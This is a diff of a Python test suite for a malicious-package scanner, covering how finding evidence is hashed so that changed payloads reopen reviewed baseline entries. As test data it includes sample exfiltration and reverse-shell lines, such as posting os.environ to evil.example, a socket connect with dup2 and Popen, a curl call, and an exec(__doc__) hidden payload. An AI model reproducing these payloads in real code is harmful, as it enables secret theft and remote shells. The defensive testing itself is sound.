@@ -147,6 +147,7 @@ def test_may12_ioc_caught_by_scan_archive():
         "malicious_fixture",
     )
     # IOC literals built at runtime so CodeQL's url-substring-sanitization rule doesn't false-positive on the `in`
+    # operand (it's evidence, not a URL).
     _ioc_host = "git-tanstack." + "com"
     _ioc_drop = "transformers." + "pyz"
     hit = any(
@@ -312,6 +313,8 @@ def test_proc_self_status_pattern_is_live():
 
 def test_fs_enum_does_not_flag_the_word_history():
     # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module mentioning "history" before "read"
+    # was filesystem enumeration -- and a CRITICAL alongside a network call. That is how httpx, urllib3, IPython and
+    # torch got baselined.
     for s in (
         "history: list[Response] | None = None\n\ndef read(self): pass\n",
         "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
@@ -367,7 +370,8 @@ def test_baseline_key_version_stable_but_path_specific():
 
 
 def test_baseline_key_line_shift_stable_but_code_specific():
-    # The evidence hash strips ``L<NN>:`` markers, so a benign upstream edit that only shifts line numbers keeps the
+    # The evidence hash strips ``L<NN>:`` markers, so a benign upstream edit that only shifts line numbers keeps the key
+    # stable...
     base = _mk(
         sp.CRITICAL,
         "botocore",
@@ -616,13 +620,15 @@ def test_httpx2_secrets_plus_network_is_one_finding():
 
 def test_extract_evidence_records_all_matches():
     # The whole point of P1: a match appended after the first few must show up in the evidence, so it changes the key
+    # instead of riding the earlier ones.
     src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(6))
     ev = sp._extract_evidence(src, sp.RE_NETWORK)
     assert ev.count("requests.get(") == 6
 
 
 def test_baseline_key_reopens_on_appended_match():
-    # A reviewed file already trips a check with several matches;
+    # A reviewed file already trips a check with several matches; a later exfil call appended to the same file/check
+    # must reopen the finding.
     base_src = "import requests\n" + "\n".join(f"requests.get('http://a{i}')" for i in range(3))
     payload_src = base_src + "\nrequests.post('https://evil.example/exfil', data=os.environ)"
     base = _mk(sp.CRITICAL, "p", "p/net.py", "net", sp._extract_evidence(base_src, sp.RE_NETWORK))
@@ -633,7 +639,8 @@ def test_baseline_key_reopens_on_appended_match():
 
 
 def test_baseline_key_inner_line_marker_is_not_stripped():
-    # Only the leading L<NN>: marker is dropped;
+    # Only the leading L<NN>: marker is dropped; an L<NN>: inside the matched code is part of the code, so changing it
+    # must reopen the finding...
     a = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L42:/p'")
     b = _mk(sp.CRITICAL, "p", "p/u.py", "c", "L10: url = 'http://h/L7:/p'")
     assert sp._finding_key(a) != sp._finding_key(b)
@@ -643,6 +650,7 @@ def test_baseline_key_inner_line_marker_is_not_stripped():
 
 def test_baseline_key_indentation_is_significant():
     # Moving a flagged line out of a guarded block (dedent) changes executable context, so the same code at a different
+    # indent must reopen the finding.
     guarded = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5:     requests.get(url)")
     top_level = _mk(sp.CRITICAL, "p", "p/x.py", "c", "L5: requests.get(url)")
     assert sp._finding_key(guarded) != sp._finding_key(top_level)
@@ -684,7 +692,8 @@ def test_extract_evidence_binds_call_continuation_past_12_lines():
 
 
 def test_logical_line_end_follows_backslash_continuation():
-    # A call split with an explicit backslash before the parenthesis must still
+    # A call split with an explicit backslash before the parenthesis must still bind the continuation line, so changing
+    # the URL on the next physical line reopens instead of returning at the zero-depth API line.
     old = "requests.post \\\n    ('http://old/x', data = 1)\n"
     new = "requests.post \\\n    ('http://evil/x', data = 1)\n"
     eo = sp._extract_evidence(old, sp.RE_NETWORK)
@@ -781,7 +790,8 @@ def test_extract_evidence_long_call_tail_past_soft_cap_reopens():
 
 def test_extract_evidence_fallback_line_numbers_are_correct():
     # The DOTALL fallback maps match offsets to line numbers via precomputed newline offsets (bisect, not a quadratic
-    # content.count per match);
+    # content.count per match); guard that the mapping is exact so a cross-line match is recorded at its true line and a
+    # changed continuation reopens.
     content = "x = 1\ny = 2\nwhile True:\n    time.sleep(60)\n    requests.get('http://a/old')\n"
     e1 = sp._extract_evidence(content, sp.RE_C2_POLLING)
     e2 = sp._extract_evidence(content.replace("/old", "/evil"), sp.RE_C2_POLLING)
@@ -791,6 +801,7 @@ def test_extract_evidence_fallback_line_numbers_are_correct():
 
 def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
     # A >100 KB JS bundle that also trips the hex-var obfuscation signature binds the whole bundle, so changing payload
+    # code elsewhere (obfuscation line unchanged) reopens rather than riding the matched signature line.
     obf = "var _0xabcd = function(){};\n"
     pad = "// filler\n" * 11000
     fo = sp.check_js_file(obf + pad + "var payload = 'old';\n", "pkg/bundle.js", "pkg")
@@ -803,6 +814,7 @@ def test_large_js_bundle_pins_whole_content_when_other_finding_fires():
 
 def test_pth_catch_all_import_evidence_is_bounded_but_reopens():
     # A large .pth made only of benign-looking imports is bounded in the evidence (prefix plus digest), not dumped in
+    # full, yet still reopens when an import line changes because the digest covers every line.
     base = "".join(f"import mod{i}\n" for i in range(200))
     fo = [
         f
@@ -821,6 +833,7 @@ def test_pth_catch_all_import_evidence_is_bounded_but_reopens():
 
 def test_extract_evidence_records_all_multiline_matches():
     # The DOTALL fallback must record every distinct cross-line match, so a second long-sleep appended below an
+    # already-flagged one reopens the finding.
     one = "foo = time.sleep(\n    600\n)\n"
     two = one + "bar = time.sleep(\n    900\n)\n"
     ev1 = sp._extract_evidence(one, sp.RE_ANTI_ANALYSIS)
@@ -831,6 +844,7 @@ def test_extract_evidence_records_all_multiline_matches():
 
 def test_multiline_evidence_reopens_on_continuation_change():
     # A DOTALL match records every line it spans, so changing the URL inside an already-flagged C2 loop (a continuation
+    # line) reopens the finding...
     old = "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
     new = "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
     fo = _mk(
@@ -860,6 +874,7 @@ def test_multiline_evidence_reopens_on_continuation_change():
 
 def test_extract_evidence_bounds_pathological_multiline_span():
     # A greedy DOTALL span is capped to its head line plus a digest of the rest, so evidence stays bounded while still
+    # binding the full match.
     big = "vmware\n" + "x\n" * 50 + "detect\n"
     ev = sp._extract_evidence(big, sp.RE_ANTI_ANALYSIS)
     assert "sha256:" in ev and ev.count("\n") <= 1
@@ -867,6 +882,7 @@ def test_extract_evidence_bounds_pathological_multiline_span():
 
 def test_canon_evidence_keeps_duplicate_spans():
     # A second identical matched line in a new code path must change the key, so an appended duplicate payload
+    # occurrence is not deduped to the same hash.
     one = "    requests.post(url, data=env)"
     base = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one}")
     dup = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one} | L5: {one}")
@@ -894,6 +910,7 @@ def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
 
 def test_capped_multiline_digest_is_line_shift_stable():
     # A span over the cap is digested from markerless code, so a pure line shift of the same span stays stable while a
+    # code change still reopens.
     src = (
         "while True:\n"
         + "    x = 1\n" * 20
@@ -910,7 +927,7 @@ def test_capped_multiline_digest_is_line_shift_stable():
 
 
 def test_canon_evidence_strips_punctuation_label_marker():
-    # A label with punctuation (network+exec:) must still be stripped, so the
+    # A label with punctuation (network+exec:) must still be stripped, so the line number alone does not change the key.
     a = "network+exec: L12: subprocess.run(['id'])"
     b = "network+exec: L99: subprocess.run(['id'])"
     assert sp._evidence_hash(a) == sp._evidence_hash(b)
@@ -918,6 +935,7 @@ def test_canon_evidence_strips_punctuation_label_marker():
 
 def test_extract_evidence_binds_call_continuation_lines():
     # A multi-line network call binds its argument lines, so a changed URL on a continuation line reopens even though
+    # the line with the API name is unchanged.
     old = "requests.post(\n    'http://old.example',\n    data=env,\n)\n"
     new = "requests.post(\n    'http://evil.example',\n    data=env,\n)\n"
     eo = sp._extract_evidence(old, sp.RE_NETWORK)
@@ -939,6 +957,9 @@ def test_extract_evidence_records_multiline_after_oneline():
 
 def test_extract_evidence_giant_span_binds_full_interior():
     # A giant greedy DOTALL span bridging anchors across the whole file is bound by a digest of its full content (not
+    # just the outer anchors), so a cross-line payload inserted into the bridged interior between unchanged outer
+    # anchors reopens instead of riding the key. (Binding only head/tail would fail open on an interior insertion.) A
+    # pure line shift still stays stable.
     gap = "\n".join(f"    x = {i}" for i in range(70))
     base = "import socket\nsock.connect(addr)\n" + gap + "\nos.dup2(fd, 0)\nsubprocess.Popen(cmd)\n"
     injected = base.replace("    x = 35", "    x = 35\n    sock.connect(evilhost)")
@@ -954,6 +975,7 @@ def test_extract_evidence_giant_span_appended_payload_reopens():
     # The anchor binding must reopen when an appended cross-line payload extends the bridged span past the cap: an
     # existing one-line /tmp+subprocess finding plus a NEW /tmp/evil line and a later subprocess.run (60+ lines apart,
     # sharing no single line so the per-line pass never binds them) moves the span's tail anchor, so the evidence
+    # changes instead of riding the unchanged key.
     existing = "import os\n/tmp/x; subprocess.run(['id'])\n"
     gap = "\n".join(f"    pad{i} = {i}" for i in range(65))
     appended = existing + "/tmp/evil\n" + gap + "\nsubprocess.run(['curl', 'evil'])\n"
@@ -966,6 +988,8 @@ def test_extract_evidence_giant_span_appended_payload_reopens():
 
 def test_hidden_payload_binds_visible_exec_trigger():
     # The hidden-payload finding binds the visible exec/eval line that makes the docstring runnable, so flipping a
+    # harmless eval("1+1") to exec(__doc__) (which now runs the same hidden network+exec payload) reopens instead of
+    # riding the key on the unchanged hidden text.
     hidden = '"""\nimport requests; requests.get("http://evil")\nsubprocess.run(["sh"])\n"""\n'
     benign = hidden + 'eval("1+1")\n'
     armed = hidden + "exec(__doc__)\n"
@@ -992,7 +1016,8 @@ def test_js_finding_pins_full_content_digest():
 
 
 def test_extract_evidence_binds_moderate_appended_dotall_span():
-    # A multi-line construct appended under a check that already has a one-line match is still recorded when it is not
+    # A multi-line construct appended under a check that already has a one-line match is still recorded when it is not a
+    # giant whole-file bridge, so its payload reopens instead of riding the old one-line match.
     one = "while True: time.sleep(60); requests.get('http://a/poll')\n"
     gap = "\n".join(f"    x = {i}" for i in range(20))
     old = one + "while True:\n" + gap + "\n    requests.get('http://old/c2')\n"
@@ -1004,13 +1029,15 @@ def test_extract_evidence_binds_moderate_appended_dotall_span():
 
 def test_canon_evidence_reorder_reopens():
     # Reordering matched lines changes executable context, so the key reopens (the canon preserves discovery order
+    # rather than sorting).
     a = "Net: L10: requests.post(url)\nEnv: L20: env = os.environ.copy()"
     b = "Env: L20: env = os.environ.copy()\nNet: L10: requests.post(url)"
     assert sp._evidence_hash(a) != sp._evidence_hash(b)
 
 
 def test_logical_line_end_ignores_brackets_in_strings():
-    # A ) inside a string argument must not close the call early, so later
+    # A ) inside a string argument must not close the call early, so later argument lines still bind and a changed
+    # payload there reopens.
     old = "requests.post('http://h/p)',\n    data=secret_old,\n)\n"
     new = "requests.post('http://h/p)',\n    data=secret_new,\n)\n"
     eo = sp._extract_evidence(old, sp.RE_NETWORK)
@@ -1020,7 +1047,8 @@ def test_logical_line_end_ignores_brackets_in_strings():
 
 
 def test_base64_exec_blob_finding_binds_every_blob():
-    # The base64+exec+blob finding digests every blob, so appending a second encoded payload reopens even when the
+    # The base64+exec+blob finding digests every blob, so appending a second encoded payload reopens even when the first
+    # blob and decode line are unchanged.
     head = "import base64\nblob1 = '" + "A" * 220 + "'\nexec(base64.b64decode(blob1))\n"
     old = head
     new = head + "blob2 = '" + "B" * 220 + "'\n"
@@ -1032,6 +1060,7 @@ def test_base64_exec_blob_finding_binds_every_blob():
 
 def test_pth_large_blob_finding_binds_every_blob():
     # The .pth large-blob finding digests every blob, so appending a second encoded payload reopens rather than riding
+    # the unchanged first blob.
     old = "import os\n" + "X" * 220 + "\n"
     new = old + "Y" * 220 + "\n"
     fo = [f for f in sp.check_pth_file(old, "p/x.pth", "p") if "large base64-like blob" in f.check]
@@ -1070,6 +1099,7 @@ def test_js_token_network_finding_binds_network_evidence():
 
 def test_embedded_pem_key_body_change_reopens():
     # The embedded-key evidence pins the full PEM block via a digest, so swapping the key body under the same BEGIN/END
+    # markers reopens the finding instead of riding the unchanged marker line.
     head = "-----BEGIN RSA PRIVATE KEY-----\n"
     tail = "\n-----END RSA PRIVATE KEY-----"
     net = "\nrequests.get('http://c2.example')\n"
@@ -1092,6 +1122,7 @@ def test_embedded_pem_key_body_change_reopens():
 
 def test_shell_combos_bind_network_evidence():
     # Both shell combos record their network/exec side, so a changed endpoint reopens instead of riding the unchanged
+    # token or hook line.
     old = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://old.example')\n"
     new = "token='ghp_AAAAAAAAAAAAAAAAAAAAAAAA'\nrequests.get('http://evil.example')\n"
     to = [
@@ -1125,6 +1156,7 @@ def test_shell_combos_bind_network_evidence():
 
 def test_hidden_network_exec_reopens_on_endpoint_change():
     # The hidden network+exec payload binds both the network and the exec signal, so changing the docstring exfil URL
+    # reopens the finding.
     old = (
         '"""\nimport urllib.request, os\nurllib.request.urlopen("http://old/x").read()\n'
         'os.system("sh -c id")\n"""\nexec(__doc__)\n'
@@ -1140,7 +1172,8 @@ def test_hidden_network_exec_reopens_on_endpoint_change():
 
 
 def test_base64_exec_blob_combo_binds_blob_digest():
-    # The blob may sit on a separate line from the decode call;
+    # The blob may sit on a separate line from the decode call; the finding now digests it, so a changed payload reopens
+    # even with unchanged base64/exec.
     b1 = "BLOB = '" + "A" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
     b2 = "BLOB = '" + "B" * 300 + "'\nimport base64\nexec(base64.b64decode(BLOB))\n"
     f1 = [f for f in sp.check_py_file(b1, "p/m.py", "p") if "large encoded blob" in f.check]
@@ -1152,6 +1185,7 @@ def test_base64_exec_blob_combo_binds_blob_digest():
 
 def test_openssl_key_combo_binds_key_evidence():
     # openssl + embedded key with no network must bind the key, so a changed key reopens instead of riding the OpenSSL
+    # line alone.
     o1 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----A"\n'
     o2 = 'import os\nos.system("openssl enc -aes-256-cbc -in d -out e")\nKEY = "-----BEGIN PRIVATE KEY-----B"\n'
     g1 = [f for f in sp.check_py_file(o1, "p/o.py", "p") if "openssl encryption" in f.check]
@@ -1163,6 +1197,7 @@ def test_openssl_key_combo_binds_key_evidence():
 
 def test_anti_analysis_combo_binds_suspicious_side():
     # The anti-analysis combo records the network/exec side, so a changed exfil endpoint reopens instead of riding the
+    # unchanged sleep/trace line.
     old = "import time, requests\ntime.sleep(600)\nrequests.get('http://old.example')\n"
     new = "import time, requests\ntime.sleep(600)\nrequests.get('http://evil.example/exfil')\n"
     fo = [
@@ -1182,6 +1217,7 @@ def test_anti_analysis_combo_binds_suspicious_side():
 
 def test_dns_exfil_combo_binds_other_side():
     # The DNS exfil combo records the co-occurring network side, so a changed endpoint reopens instead of riding the
+    # unchanged DNS line.
     old = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://old.example')\n"
     new = "import dns.resolver\ndns.resolver.resolve('x.old.com','TXT')\nrequests.get('http://evil.example/x')\n"
     fo = [
@@ -1210,6 +1246,7 @@ def test_large_js_bundle_finding_is_content_bound():
 
 def test_pth_large_blob_finding_is_content_bound():
     # The .pth base64-blob evidence pins the full blob via a digest, so a payload that keeps the first 120 chars but
+    # changes the tail reopens the finding.
     head = "A" * 120
     # Two different payloads of equal size and import count must get different keys:
     a = [
@@ -1229,6 +1266,7 @@ def test_pth_large_blob_finding_is_content_bound():
 
 def test_pth_import_lines_record_all_not_first_five():
     # All executable import lines are recorded, so swapping the sixth import for a malicious one (first five unchanged)
+    # still reopens the catch-all finding.
     base = "".join(f"import mod{i}\n" for i in range(6))
     swapped = "".join(f"import mod{i}\n" for i in range(5)) + "import evil\n"
     fb = [f for f in sp.check_pth_file(base, "p/x.pth", "p") if "executable import line" in f.check]
@@ -1241,6 +1279,7 @@ def test_pth_import_lines_record_all_not_first_five():
 
 def test_load_baseline_warns_on_missing_evidence_hash(tmp_path, capsys):
     # A legacy baseline predating evidence_hash still loads (hash recomputed) but must WARN so the maintainer
+    # regenerates rather than degrade silently.
     import json
 
     bl = tmp_path / "legacy.json"
@@ -1453,6 +1492,7 @@ def test_committed_baseline_entries_all_carry_evidence_hash():
     """Every shipped entry must pin an evidence_hash; an entry without one would
     silently fall back to the coarse legacy match for that file/check."""
     # A malformed baseline whose "entries" is not a list must warn and fail closed (empty), not raise TypeError when
+    # iterated.
     import json
 
     baseline_path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
@@ -1576,7 +1616,8 @@ def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
 
 
 def test_requires_dist_for_uses_pinned_release(monkeypatch):
-    # Project-level (latest) metadata declares no malicious dep;
+    # Project-level (latest) metadata declares no malicious dep; the pinned release does. _requires_dist_for must follow
+    # the pinned release's tree.
     project = _meta([], requires = ["harmless>=1"])
     pinned = _meta([], requires = ["payload==1.0.0"])
     monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: pinned if version else project)
@@ -1939,6 +1980,7 @@ def test_the_duplicate_check_sees_through_normalization(tmp_path):
         evidence_hash = sp._evidence_hash("L1:     while True:"),
     )
     # CRITICAL package with no pinned version -> must download to resolve it, reaching downloaded[0][1] (the first
+    # archive's path).
     entries = [
         dict(package = "huggingface_hub", file = "foo-1.0/huggingface_hub/a.py", **same),
         dict(package = "huggingface-hub", file = "huggingface_hub/a.py", **same),
